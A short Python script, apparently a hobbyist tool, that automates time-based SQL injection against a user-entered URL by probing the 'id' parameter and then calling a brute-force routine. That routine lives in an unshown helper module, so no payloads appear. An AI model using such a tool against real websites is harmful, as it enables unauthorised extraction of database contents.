#! /usr/bin/env python3

#Code to automate time based sqli

import requests
import fun  #the file with the functions

url = input("Enter url: ")
r = requests.get(url)
print("status : ",r.status_code) # prints http status code to check if the site is up

characters=[]
characters.append(fun.escape(url,"?id"))
if not characters :
    print("Unable to execute time based sql inections")
else :
    print("Trying to bruteforce information")
    fun.bruteforce()



